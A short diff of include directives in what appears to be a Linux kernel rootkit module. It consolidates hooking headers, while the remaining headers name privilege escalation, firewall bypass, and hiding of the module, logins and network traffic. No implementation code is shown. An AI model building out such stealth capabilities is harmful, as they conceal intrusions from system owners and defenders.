@@ -11,8 +11,6 @@
 #include <linux/filter.h>
 #include <net/sock.h>
 #include <net/tcp.h>
-#include "hooking/syscall.h"
-#include "hooking/func.h"
 #include "capabilities/privilege.h"
 #include "capabilities/unloading.h"
 #include "capabilities/fw_bypass.h"
@@ -20,6 +18,7 @@
 #include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
 #include "capabilities/hiding/net.h"
+#include "hooking.h"
 #include "state.h"
 #include "utils.h"
 #include "config.h"
